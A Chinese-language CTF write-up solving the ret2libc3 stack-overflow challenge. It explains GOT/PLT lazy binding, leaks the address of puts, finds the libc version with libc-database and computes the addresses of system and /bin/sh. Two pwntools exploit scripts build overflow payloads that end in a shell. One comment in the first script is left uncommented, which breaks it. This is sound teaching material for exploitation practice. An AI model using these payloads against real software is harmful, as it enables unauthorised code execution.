> 示例：[https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3)
>
> 参考资料：[https://blog.csdn.net/qq_41918771/article/details/90665950](https://blog.csdn.net/qq_41918771/article/details/90665950)
>
> [https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#3](https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#3)
>

将文件下载下来，检查一下文件保护：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596772481361-94ed9d60-a346-41f6-a825-7ecde28465cb.png)

32位程序，只开启了栈上不可执行保护。

扔到IDA中：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596772613000-274cd9fd-e770-46da-9322-6f7e2e2c6c84.png)

计算栈偏移，可以得到为112（略），在IDA里看一下，并没有发现system函数和/bin/sh字符串的身影。

现在当务之急就是得到system函数的地址，那么我们如何得到呢？这里就主要利用了两个知识点：

+ system 函数属于 libc，而 **<font style="color:#F5222D;">libc.so 动态链接库中的函数之间相对偏移是固定的。</font>**
+ 即使程序有 ASLR 保护，**也只是针对于地址中间位进行随机，最低的12位并不会发生改变**。而 libc 在github上有人进行收集，如下[https://github.com/niklasb/libc-database](https://github.com/niklasb/libc-database)

> 也可以使用工具网站：[https://libc.blukat.me/](https://libc.blukat.me/)，这个网址的数据库基于libc-database
>

所以我们只要得到libc的版本，就可以知道了system函数和/bin/sh的偏移量。知道偏移量后，再找到libc的基地址，就可以得到system函数的真实地址，就可以做我们想要做的事情了，我们可以通过一个公式来得到system的真实地址。

> libc基地址  +  函数偏移量   =  函数真实地址
>

应该怎么找libc基地址呢？真是一个让人头疼的问题。

我们可以泄露一个函数的真实地址，然后根据公式可以得到libc的基地址，因为知道了libc版本，就知道了函数偏移量。

问题又来了，我们该如何泄露函数的真实地址的，这里涉及到了libc的**<font style="color:#F5222D;">延迟绑定技术</font>**，这个技术大概就是当第一次调用一个函数的时候，这个函数的got表里存放着是下一条plt表的指令的地址，然后再经过一系列的操作(这里不详解got表和plt表的关系了，太复杂)得到了这个函数的真实地址，然后呢，再把这个函数的真实地址放到了got表里。当第二次调用这个函数的时候，就可以直接从Got表里取函数的真实地址，不用再去寻找了。

我们要泄露函数的真实地址**<font style="color:#F5222D;">，一般的方法是采用got表泄露，因为只要之前执行过puts函数，got表里存放着就是函数的真实地址了，这里我用的是puts函数，因为程序里已经运行过了puts函数，真实地址已经存放到了got表内。我们得到puts函数的got地址后，可以把这个地址作为参数传递给puts函数，则会把这个地址里的数据，即puts函数的真实地址给输出出来，这样我们就得到了puts函数的真实地址。</font>**

**<font style="color:#F5222D;">脚本如下：</font>**

```python
from pwn import *

p = process('./ret2libc3')
elf = ELF('./ret2libc3')

puts_got_addr = elf.got['puts']#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象
puts_plt_addr = elf.plt['puts']#puts的plt表的地址，我们需要利用puts函数泄露
main_plt_addr = elf.symbols['_start']#返回地址被覆盖为main函数的地址。使程序还可被溢出

print "puts_got_addr = ",hex(puts_got_addr)
print "puts_plt_addr = ",hex(puts_plt_addr)
print "main_plt_addr = ",hex(main_plt_addr)

payload = ''
payload += 'A'*112
payload += p32(puts_plt_addr)#覆盖返回地址为puts函数
payload += p32(main_plt_addr)#这里是puts函数返回的地址。
payload += p32(puts_got_addr)#这里是puts函数的参数

p.recv()
p.sendline(payload)

puts_addr = u32(p.recv()[0:4])将地址输出出来后再用332解包，此时就得到了puts函数的真实地址。
print "puts_addr = ",hex(puts_addr)
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596774478252-40612ad2-abce-46fa-87ef-202faa2e0789.png)

> 运行后得到函数的真实地址为0xf7d51fd0
>
> 上面说过，需要知道libc的版本才能知道函数偏移量，我们根据函数真实地址可以得到libc版本。aslr技术，是地址随机化，虽然是地址随机化，但低十二位是不变的，因为需要内存页对齐，puts函数的真实地址0xf7d51fd0的低十二位是fd0，然后在网站libc_search上可以根据后十二位查到这个函数所在的libc的版本。
>

---

> **<font style="color:#F5222D;">由于上面提到的网站无法查到kali 2019二月版本的libc版本（我使用的是这个版本），再加上是本地pwn，因此我们使用kali本地自带的libc库文件就行了。当然，在实际环境中，肯定需要目标靶机的libc。</font>**
>
> **<font style="color:#F5222D;">网站上大部分为ubuntu的libc文件</font>**
>

如何查找libc所在文件目录？如下图所示

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596857155686-2be9e0eb-b3b9-44b6-a595-f2789b2bf35a.png)

> /usr/lib/x86_64-linux-gnu/libc.so.6    #这个libc应该是编译elf文件时候所用到的
>
> /usr/lib32/libc.so.6    #这个是运行elf文件时加载程序所用到的
>

进入到/usr/lib32/目录下，找到此文件

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596857341114-6be8ef60-20ff-462f-ac72-3af0b1b18c0e.png)

拖入到宿主机中，却发现

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596857397829-fd97521d-b4db-4bf8-b017-a6816b7c70db.png)

右键，将文件添加到压缩包中，然后拖出来。

放入HxD中查看此文件：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596857503836-fb007dbc-edb8-427e-b33c-0ede3e39e6c7.png)

原来此符号链接链接的是同目录下的libc-2.28.so文件

顺利的将libc-2.28.so文件拖入到宿主机中，直接扔到IDA里分析。

当然，也可以使用上面提到的工具[libc-database](https://github.com/niklasb/libc-database)

> 在kali中，执行如下命令：
>
> git clone [https://github.com/niklasb/libc-database.git](https://github.com/niklasb/libc-database.git)
>
> ![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596857874861-17459aa0-4fcd-42ac-bd29-516fea885581.png)
>

---

在github上可以轻松的找到教程：

**Building a libc offset database**

Fetch all the configured libc versions and extract the symbol offsets. It will not download anything twice, so you can also use it to update your database:

```plain
$ ./get   #安装或更新你的libc数据库
```

You can also add a custom libc to your database.

```plain
$ ./add /usr/lib/libc-2.21.so   #添加本地的libc文件到数据库
```

Find all the libc's in the database that have the given names at the given addresses. Only the last 12 bits are checked, because randomization usually works on page size level.

```plain
$ ./find printf 260 puts f30    #查找符合要求的libc数据库文件
archive-glibc (id libc6_2.19-10ubuntu2_i386)
```

Find a libc from the leaked return address into __libc_start_main.

```plain
$ ./find __libc_start_main_ret a83
ubuntu-trusty-i386-libc6 (id libc6_2.19-0ubuntu6.6_i386)
archive-eglibc (id libc6_2.19-0ubuntu6_i386)
ubuntu-utopic-i386-libc6 (id libc6_2.19-10ubuntu2.3_i386)
archive-glibc (id libc6_2.19-10ubuntu2_i386)
archive-glibc (id libc6_2.19-15ubuntu2_i386)
```

Dump some useful offsets, given a libc ID. You can also provide your own names to dump.

```plain
$ ./dump libc6_2.19-0ubuntu6.6_i386     #dumplibc文件的部分数据偏移信息
offset___libc_start_main_ret = 0x19a83
offset_system = 0x00040190
offset_dup2 = 0x000db590
offset_recv = 0x000ed2d0
offset_str_bin_sh = 0x160a24
```

Check whether a library is already in the database.

```plain
$ ./identify /usr/lib/libc.so.6
id local-f706181f06104ef6c7008c066290ea47aa4a82c5
```

Download the whole libs corresponding to a libc ID.

```plain
$ ./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
    -> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
    -> Downloading package
    -> Extracting package
    -> Package saved to libs/libc6_2.23-0ubuntu10_amd64
$ ls libs/libc6_2.23-0ubuntu10_amd64
ld-2.23.so ... libc.so.6 ... libpthread.so.0 ...
```

---

首先添加本地的libc文件：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596859076768-336f9eda-ae2b-424e-8b8d-5d938d7af69d.png)

查看libc文件的部分信息：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596860749324-b1a326ac-5da2-48eb-bce2-1f334eb35996.png)

至此我们得到了system函数的偏移量和/bin/sh的偏移量(即str_bin_sh)。(当然，在IDA里也可以查看)

最后理一下思路

1.泄露puts函数的真实地址

2.得到libc的版本

3.得到system和puts和sh的偏移，计算libc基地址

4.计算system和sh的真实地址

5.构造payload为system(’/bin/sh’)

6.写exp

在上一个脚本的基础上加几行代码

```python
from pwn import *

p = process('./ret2libc3')
elf = ELF('./ret2libc3')

puts_got_addr = elf.got['puts']
puts_plt_addr = elf.plt['puts']
main_plt_addr = elf.symbols['_start']

print "puts_got_addr = ",hex(puts_got_addr)
print "puts_plt_addr = ",hex(puts_plt_addr)
print "main_plt_addr = ",hex(main_plt_addr)

payload = ''
payload += 'A'*112
payload += p32(puts_plt_addr)
payload += p32(main_plt_addr)
payload += p32(puts_got_addr)

p.recv()
p.sendline(payload)

puts_addr = u32(p.recv()[0:4])
print "puts_addr = ",hex(puts_addr)
sys_offset = 0x0003e980
puts_offset = 0x00068FD0
sh_offset = 0x00017eaaa

libc_base_addr = puts_addr - puts_offset 
sys_addr = libc_base_addr + sys_offset
sh_addr = libc_base_addr + sh_offset 

print "libc_base_addr = ",hex(libc_base_addr)
print "sys_addr = ",hex(sys_addr)
print "sh_addr = ",hex(sh_addr)

payload = ''
payload += 'A'*112
payload += p32(sys_addr)
payload += "AAAA"  
payload += p32(sh_addr)  

p.sendline(payload)
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596861272161-aebfca6f-05c8-487d-a31f-b4763fbfb557.png)

